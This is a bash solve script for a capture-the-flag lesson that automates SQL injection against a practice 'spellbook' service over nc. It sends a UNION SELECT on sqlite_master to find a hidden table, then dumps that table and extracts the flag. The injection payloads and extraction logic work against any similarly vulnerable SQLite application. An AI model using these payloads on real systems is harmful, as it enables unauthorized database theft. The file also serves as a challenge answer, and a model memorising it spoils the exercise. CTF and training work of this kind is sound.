#!/usr/bin/env bash
# Babs's Spellbook, Lesson 3: Names Have Power - automated solve.
# $TARGET is "host port".
#
# The index card search is injectable, but the flag lives in a hidden table
# whose name the player does not know. The lesson loops, so two casts fit in
# one connection (the database is per-connection and would forget otherwise):
#
#   cast 1: UNION SELECT name, sql FROM sqlite_master
#           -> the schema table names every table and its CREATE statement
#   cast 2: UNION SELECT * FROM <discovered table>
#
# The second cast depends on the first response, so this solve holds the nc
# session open over a FIFO pair instead of piping a fixed script in.
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30002}"

WORK=$(mktemp -d)
IN="$WORK/in"
OUT="$WORK/out"
NC_PID=""

session_close() {
  [[ -n "$NC_PID" ]] && kill "$NC_PID" 2>/dev/null || true
  exec 3>&- 4<&- 2>/dev/null || true
  rm -rf "$WORK"
}
trap session_close EXIT

# Babs's paced dialogue may delay a full line.
# Prompts end in a space, not a newline, so consume bytes until the marker.
wait_for() {
  local char seen=""
  while IFS= read -r -N 1 -t 120 char <&4; do
    seen+="$char"
    [[ "$seen" == *"$1"* ]] && return 0
    (( ${#seen} > 256 )) && seen=${seen: -256}
  done
  return 1
}

# Return the result rows before the next inline prompt.
read_until_prompt() {
  local char seen="" marker="Search index cards (blank to leave): " menu="Lesson: "
  while IFS= read -r -N 1 -t 120 char <&4; do
    seen+="$char"
    if [[ "$seen" == *"$marker" ]]; then
      printf '%s' "${seen%"$marker"}"
      return 0
    fi
    if [[ "$seen" == *"$menu" ]]; then
      printf '%s' "${seen%"$menu"}"
      return 0
    fi
  done
  return 1
}

die() { echo "solve: $1 from $host:$port" >&2; exit 1; }

mkfifo "$IN" "$OUT"
nc "$host" "$port" <"$IN" >"$OUT" &
NC_PID=$!
exec 3>"$IN"
exec 4<"$OUT"

printf '3\n' >&3
wait_for "Search index cards (blank to leave):" || die "no lesson 3 prompt"

# Cast 1: ask the spellbook to describe itself.
printf "%s\n" "' UNION SELECT name, sql FROM sqlite_master --" >&3
discovery=$(read_until_prompt) || die "schema cast got no answer"

# The CREATE statements name every table; the visible one is index_cards.
create=$(printf '%s\n' "$discovery" \
         | grep -oE 'CREATE TABLE [a-z_]+\([^)]*\)' \
         | grep -v 'index_cards' \
         | head -1)
[[ -n "$create" ]] || die "no hidden table in the schema"
table=${create#CREATE TABLE }
table=${table%%(*}

# Cast 2: borrow the hidden table's own columns.
printf "%s\n" "' UNION SELECT * FROM $table --" >&3
rows=$(read_until_prompt) || die "extraction cast got no answer"
printf '\n' >&3

flag=$(printf '%s\n' "$rows" | grep -oE 'noco\{[^}]+\}' | head -1)
[[ -n "$flag" ]] || die "no flag in $table"
echo "$flag"
